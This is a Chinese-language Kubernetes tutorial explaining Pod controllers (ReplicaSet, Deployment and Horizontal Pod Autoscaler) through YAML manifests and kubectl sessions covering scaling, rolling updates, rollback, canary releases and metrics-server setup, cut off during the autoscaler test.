pod 删除了之后还会自动重建\n\n> 什么是Pod控制器\n> Pod 控制器是管理 pod 的中间层，使用 Pod 控制器之后，只需要告诉 Pod 控制器，想要多少个什么样的 Pod 就可以了，它会创建出满足条件的 Pod 并确保每一个 Pod 资源处于用户期望的目标状态。如果 Pod 资源在运行中出现故障，它会基于指定策略重新编排 Pod。\n\n在 kubernetes 中，有很多类型的 pod 控制器，每种都有自己的适合的场景，常见的有下面这些：\n\n * ReplicationController：比较原始的 pod 控制器，已经被废弃，由 ReplicaSet 替代\n * ReplicaSet：保证副本数量一直维持在期望值，并支持 pod 数量扩缩容，镜像版本升级\n * Deployment：通过控制 ReplicaSet 来控制 Pod，并支持滚动升级、回退版本\n * Horizontal Pod Autoscaler：可以根据集群负载自动水平调整 Pod 的数量，实现削峰填谷\n * DaemonSet：在集群中的指定 Node 上运行且仅运行一个副本，一般用于守护进程类的任务\n * Job：它创建出来的 pod 只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务\n * Cronjob：它创建的 Pod 负责周期性任务控制，不需要持续后台运行\n * StatefulSet：管理有状态应用\n\n\n# ReplicaSet(RS)\n\nReplicaSet 的主要作用是保证一定数量的 pod 正常运行，它会持续监听这些 Pod 的运行状态，一旦 Pod 发生故障，就会重启或重建。同时它还支持对 pod 数量的扩缩容和镜像版本的升降级。\n\n\n\nReplicaSet 的资源清单文件：\n\napiVersion: apps/v1 # 版本号\nkind: ReplicaSet # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: rs\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在这里面，需要新了解的配置项就是 spec 下面几个选项：\n\n * replicas：指定副本数量，其实就是当前 rs 创建出来的 pod 的数量，默认为 1\n * selector：选择器，它的作用是建立 pod 控制器和 pod 之间的关联关系，采用的 Label Selector 机制\n   在 pod 模板上定义 label，在控制器上定义选择器，就可以表明当前控制器能管理哪些 pod 了\n * template：模板，就是当前控制器创建 pod 所使用的模板板，里面其实就是前一章学过的 pod 的定义\n\n创建 ReplicaSet\n创建 pc-replicaset.yaml 文件，内容如下：\n\napiVersion: apps/v1\nkind: ReplicaSet   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建rs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# 查看rs\n# DESIRED:期望副本数量  \n# CURRENT:当前副本数量  \n# READY:已经准备好提供服务的副本数量\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nNAME          DESIRED   CURRENT READY AGE   CONTAINERS   IMAGES             SELECTOR\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# 查看当前控制器创建出来的pod\n# 这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码\n[root@k8s-master01 ~]# kubectl get pod -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          54s\npc-replicaset-fmb8f   1/1     Running   0          54s\npc-replicaset-snrk2   1/1     Running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n扩缩容\n\n# 编辑rs的副本数量，修改spec:replicas: 6即可\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          114m\npc-replicaset-cftnp   1/1     Running   0          10s\npc-replicaset-fjlm6   1/1     Running   0          10s\npc-replicaset-fmb8f   1/1     Running   0          114m\npc-replicaset-s2whj   1/1     Running   0          10s\npc-replicaset-snrk2   1/1     Running   0          114m\n\n# 当然也可以直接使用命令实现\n# 使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# 命令运行完毕，立即查看，发现已经有4个开始准备退出了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS        RESTARTS   AGE\npc-replicaset-6vmvt   0/1     Terminating   0          118m\npc-replicaset-cftnp   0/1     Terminating   0          4m17s\npc-replicaset-fjlm6   0/1     Terminating   0          4m17s\npc-replicaset-fmb8f   1/1     Running       0          118m\npc-replicaset-s2whj   0/1     Terminating   0          4m17s\npc-replicaset-snrk2   1/1     Running       0          118m\n\n#稍等片刻，就只剩下2个了\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npc-replicaset-fmb8f   1/1     Running   0          119m\npc-replicaset-snrk2   1/1     Running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n镜像升级\n\n# 编辑rs的容器镜像 - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# 同样的道理，也可以使用命令完成这个工作\n# kubectl set image rs rs名称 容器=镜像版本 -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# 再次查看，发现镜像版本已经变更了\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                 DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n删除 ReplicaSet\n\n# 使用kubectl delete命令会删除此RS以及它管理的Pod\n# 在kubernetes删除RS前，会将RS的replicasclear调整为0，等待所有的Pod被删除后，在执行RS对象的删除\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nNo resources found in dev namespace.\n\n# 如果希望仅仅删除RS对象（保留Pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\npc-replicaset-cl82j   1/1     Running   0          75s\npc-replicaset-dslhb   1/1     Running   0          75s\n\n# 也可以使用yaml直接删除(推荐)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Deployment(Deploy)\n\n为了更好的解决服务编排的问题，kubernetes 在 V1.2 版本开始，引入了 Deployment 控制器。值得一提的是，这种控制器并不直接管理 pod，而是通过管理 ReplicaSet 来简介管理 Pod，即：Deployment 管理 ReplicaSet，ReplicaSet 管理 Pod。所以 Deployment 比 ReplicaSet 功能更加强大。\n\n\n\nDeployment 主要功能有下面几个：\n\n * 支持 ReplicaSet 的所有功能\n * 支持发布的停止、继续\n * 支持滚动更新和回滚版本\n\nDeployment 的资源清单文件：\n\napiVersion: apps/v1 # 版本号\nkind: Deployment # 类型       \nmetadata: # 元数据\n  name: # rs名称 \n  namespace: # 所属命名空间 \n  labels: #标签\n    controller: deploy\nspec: # 详情描述\n  replicas: 3 # 副本数量\n  revisionHistoryLimit: 3 # 保留历史版本\n  paused: false # 暂停部署，默认是false\n  progressDeadlineSeconds: 600 # 部署超时时间（s），默认是600\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate: # 滚动更新\n      maxSurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数\n      maxUnavailable: 30% # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数\n  selector: # 选择器，通过它指定该控制器管理哪些pod\n    matchLabels:      # Labels匹配规则\n      app: nginx-pod\n    matchExpressions: # Expressions匹配规则\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n创建 deployment\n创建 pc-deployment.yaml，内容如下：\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建deployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# 查看deployment\n# UP-TO-DATE 最新版本的pod的数量\n# AVAILABLE  当前可用的pod的数量\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   3/3     3            3           15s\n\n# 查看rs\n# 发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   3         3         3       23s\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          107s\npc-deployment-6696798b78-smpvp   1/1     Running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n扩缩容\n\n# 变更副本数量为5个\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# 查看deployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   5/5     5            5           2m\n\n# 查看pod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          94s\npc-deployment-6696798b78-mktqv   1/1     Running   0          93s\npc-deployment-6696798b78-smpvp   1/1     Running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          4m19s\n\n# 编辑deployment的副本数量，修改spec:replicas: 4即可\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     Running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n镜像更新\ndeployment 支持两种更新策略: 重建更新（删掉所有老版本得pod，然后重建新版本的pod） 和 滚动更新（默认）（不会一次性删除，先删一部分低版本，建立一部分新版本，以此类推，直到满足数量） , 可以通过 strategy 指定策略类型，支持两个属性:\n\nstrategy：指定新的Pod替换旧的Pod的策略， 支持两个属性：\n  type：指定策略类型，支持两种策略\n    Recreate：在创建出新的Pod之前会先杀掉所有已存在的Pod\n    RollingUpdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本Pod\n  rollingUpdate：当type为RollingUpdate时生效，用于为RollingUpdate设置参数，支持两个属性：\n    maxUnavailable：用来指定在升级过程中不可用Pod的最大数量，默认为25%。\n    maxSurge： 用来指定在升级过程中可以超过期望的Pod的最大数量，默认为25%。\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n重建更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: Recreate # 重建更新\n\n\n1\n2\n3\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-65qcw   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     Running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     Terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     Terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     Pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     Pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     Pending       0          0s\n\npc-deployment-675d469f8b-grn8z   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-hbl4v   0/1     ContainerCreating   0          0s\npc-deployment-675d469f8b-67nz2   0/1     ContainerCreating   0          0s\n\npc-deployment-675d469f8b-grn8z   1/1     Running             0          1s\npc-deployment-675d469f8b-67nz2   1/1     Running             0          1s\npc-deployment-675d469f8b-hbl4v   1/1     Running             0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n滚动更新\n1. 编辑 pc-deployment.yaml, 在 spec 节点下添加更新策略\n\nspec:\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n    rollingUpdate:\n      maxSurge: 25% \n      maxUnavailable: 25%\n\n\n1\n2\n3\n4\n5\n6\n\n\n2. 创建 deploy 进行验证\n\n# 变更镜像\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev \ndeployment.apps/pc-deployment image updated\n\n# 观察升级过程\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME                           READY   STATUS    RESTARTS   AGE\npc-deployment-c848d767-8rbzt   1/1     Running   0          31m\npc-deployment-c848d767-h4p68   1/1     Running   0          31m\npc-deployment-c848d767-hlmz4   1/1     Running   0          31m\npc-deployment-c848d767-rrqcn   1/1     Running   0          31m\n\npc-deployment-966bf7f44-226rx   0/1     Pending             0          0s\npc-deployment-966bf7f44-226rx   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-226rx   1/1     Running             0          1s\npc-deployment-c848d767-h4p68    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-cnd44   0/1     Pending             0          0s\npc-deployment-966bf7f44-cnd44   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-cnd44   1/1     Running             0          2s\npc-deployment-c848d767-hlmz4    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-px48p   0/1     Pending             0          0s\npc-deployment-966bf7f44-px48p   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-px48p   1/1     Running             0          0s\npc-deployment-c848d767-8rbzt    0/1     Terminating         0          34m\n\npc-deployment-966bf7f44-dkmqp   0/1     Pending             0          0s\npc-deployment-966bf7f44-dkmqp   0/1     ContainerCreating   0          0s\npc-deployment-966bf7f44-dkmqp   1/1     Running             0          2s\npc-deployment-c848d767-rrqcn    0/1     Terminating         0          34m\n\n# 至此，新版本的pod创建完毕，就版本的pod销毁完毕\n# 中间过程是滚动进行的，也就是边销毁边创建\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n滚动更新的过程：\n\n\n\n镜像更新中 rs 的变化，可以在创建镜像得时候加 --recode 参数，有助于记录创建过程等。\n\n# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4\n# 其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   0         0         0       7m37s\npc-deployment-6696798b11   0         0         0       5m37s\npc-deployment-c848d76789   4         4         4       72s\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n版本回退\ndeployment 支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看.\n\nkubectl rollout： 版本升级相关功能，支持下面的选项：\n\n * status 显示当前升级状态\n * history 显示 升级历史记录\n * pause 暂停版本升级过程\n * resume 继续已经暂停的版本升级过程\n * restart 重启版本升级过程\n * undo 回滚到上一级版本（可以使用 --to-revision 回滚到指定版本）\n\n# 查看当前升级版本的状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev\ndeployment "pc-deployment" successfully rolled out\n\n# 查看升级历史记录\n[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n dev\ndeployment.apps/pc-deployment\nREVISION  CHANGE-CAUSE\n1         kubectl create --filename=pc-deployment.yaml --record=true\n2         kubectl create --filename=pc-deployment.yaml --record=true\n3         kubectl create --filename=pc-deployment.yaml --record=true\n# 可以发现有三次版本记录，说明完成过两次升级\n\n# 版本回滚\n# 这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本\n[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n dev\ndeployment.apps/pc-deployment rolled back\n\n# 查看发现，通过nginx镜像版本可以发现到了第一版\n[root@k8s-master01 ~]# kubectl get deploy -n dev -o wide\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES         \npc-deployment   4/4     4            4           74m   nginx        nginx:1.17.1   \n\n# 查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行\n# 其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，\n# 一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   4         4         4       78m\npc-deployment-966bf7f44    0         0         0       37m\npc-deployment-c848d767     0         0         0       71m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n金丝雀发布\nDeployment 控制器支持控制更新过程中的控制，如 “暂停 (pause)” 或 “继续 (resume)” 更新操作。\n\n比如有一批新的 Pod 资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的 Pod 应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的 Pod 资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。\n\n# 更新deployment的版本，并配置暂停deployment\n[root@k8s-master01 ~]#  kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev && kubectl rollout pause deployment pc-deployment  -n dev\ndeployment.apps/pc-deployment image updated\ndeployment.apps/pc-deployment paused\n\n#观察更新状态\n[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev　\nWaiting for deployment "pc-deployment" rollout to finish: 2 out of 4 new replicas have been updated...\n\n# 监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令\n\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   3         3         3       19m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       14m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   2         2         2       3m16s   nginx        nginx:1.17.4   \n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-5d89bdfbf9-rj8sq   1/1     Running   0          7m33s\npc-deployment-5d89bdfbf9-ttwgg   1/1     Running   0          7m35s\npc-deployment-5d89bdfbf9-v4wvc   1/1     Running   0          7m34s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          3m31s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          3m31s\n\n# 确保更新的pod没问题了，继续更新\n[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n dev\ndeployment.apps/pc-deployment resumed\n\n# 查看最后的更新情况\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                       DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES         \npc-deployment-5d89bdfbf9   0         0         0       21m     nginx        nginx:1.17.1   \npc-deployment-675d469f8b   0         0         0       16m     nginx        nginx:1.17.2   \npc-deployment-6c9f56fcfb   4         4         4       5m11s   nginx        nginx:1.17.4   \n\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6c9f56fcfb-7bfwh   1/1     Running   0          37s\npc-deployment-6c9f56fcfb-996rt   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-j2gtj   1/1     Running   0          5m27s\npc-deployment-6c9f56fcfb-rf84v   1/1     Running   0          37s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n删除 Deployment\n\n# 删除deployment，其下的rs和pod也将被删除\n[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yaml\ndeployment.apps "pc-deployment" deleted\n\n\n1\n2\n3\n\n\n\n# Horizontal Pod Autoscaler(HPA)\n\n在前面的课程中，我们已经可以实现通过手工执行 kubectl scale 命令实现 Pod 扩容或缩容，但是这显然不符合 Kubernetes 的定位目标 -- 自动化、智能化。 Kubernetes 期望可以实现通过监测 Pod 的使用情况，实现 pod 数量的自动调整，于是就产生了 Horizontal Pod Autoscaler（HPA）这种控制器。\n\nHPA 可以获取每个 Pod 利用率，然后和 HPA 中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现 Pod 的数量的调整。其实 HPA 与之前的 Deployment 一样，也属于一种 Kubernetes 资源对象，它通过追踪分析 RC 控制的所有目标 Pod 的负载变化情况，来确定是否需要针对性地调整目标 Pod 的副本数，这是 HPA 的实现原理。\n\n\n\n1 安装 metrics-server\nmetrics-server 可以用来收集集群中的资源使用情况\n\n# 安装git\n[root@k8s-master01 ~]# yum install git -y\n# 获取metrics-server, 注意使用的版本\n[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server\n# 修改deployment, 注意修改的是镜像和初始化参数\n[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/\n[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml\n按图中添加下面选项\nhostNetwork: true\nimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6\nargs:\n- --kubelet-insecure-tls\n- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n\n# 安装metrics-server\n[root@k8s-master01 1.8+]# kubectl apply -f ./\n\n# 查看pod运行情况\n[root@k8s-master01 1.8+]# kubectl get pod -n kube-system\nmetrics-server-6b976979db-2xwbj   1/1     Running   0          90s\n\n# 使用kubectl top node 查看资源使用情况\n[root@k8s-master01 1.8+]# kubectl top node\nNAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-master01   289m         14%    1582Mi          54%       \nk8s-node01     81m          4%     1195Mi          40%       \nk8s-node02     72m          3%     1211Mi          41%  \n[root@k8s-master01 1.8+]# kubectl top pod -n kube-system\nNAME                              CPU(cores)   MEMORY(bytes)\ncoredns-6955765f44-7ptsb          3m           9Mi\ncoredns-6955765f44-vcwr5          3m           8Mi\netcd-master                       14m          145Mi\n...\n# 至此,metrics-server安装完成\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n2 准备 deployment 和 servie\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  strategy: # 策略\n    type: RollingUpdate # 滚动更新策略\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        resources: # 资源配额\n          limits:  # 限制资源（上限）\n            cpu: "1" # CPU限制，单位是core数\n          requests: # 请求资源（下限）\n            cpu: "100m"  # CPU限制，单位是core数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 创建service\n[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev\n\n\n1\n2\n\n\n# 查看\n[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n dev\nNAME                    READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/nginx   1/1     1            1           47s\n\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-7df9756ccc-bh8dr   1/1     Running   0          47s\n\nNAME            TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nservice/nginx   NodePort   10.101.18.29   <none>        80:31830/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n3 部署 HPA\n创建 pc-hpa.yaml 文件，内容如下：\n\napiVersion: autoscaling/v1\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: pc-hpa\n  namespace: dev\nspec:\n  minReplicas: 1  #最小pod数量\n  maxReplicas: 10 #最大pod数量\n  targetCPUUtilizationPercentage: 3 # CPU使用率指标（3%）\n  scaleTargetRef:   # 指定要控制的nginx信息\n    apiVersion: apps/v1\n    kind: Deployment\n    name: nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建hpa\n[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yaml\nhorizontalpodautoscaler.autoscaling/pc-hpa created\n\n# 查看hpa\n    [root@k8s-master01 1.8+]# kubectl get hpa -n dev\nNAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGE\npc-hpa   Deployment/nginx   0%/3%     1         10        1          62s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n4 测试\n使用压测工具对 service 地址 192.168.5.4:31830 进行压测，然后通过控制台查看 hpa 和 pod 的变化\nhpa 变化\n\n[root@k8s-master01 ~]# kubectl get hpa -n dev -w\nNAME   REFERENCE      TARGETS  MINPODS  MAXPODS  REPLICAS  AGE\npc-hpa  Deployment/nginx  0%/3%   1     10     1      4m11s\npc-hpa  Deployment/nginx  0%/3%   1     10     1      5m19s\npc-hpa  Deployment/nginx  22%/3%   1     10     1      6m50s\npc-hpa  Deployment/nginx  22%/3%   1     10     4      7m5s\npc-hpa  Deployment/nginx  22%/3%   1     10     8      7m21s\npc-hpa  Deployment/nginx  6%/3%   1     10     8      7m51s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      9m6s\npc-hpa  Deployment/nginx  0%/3%   1     10     8      13m\npc-hpa  Deployment/nginx  0%/3%   1     10     1      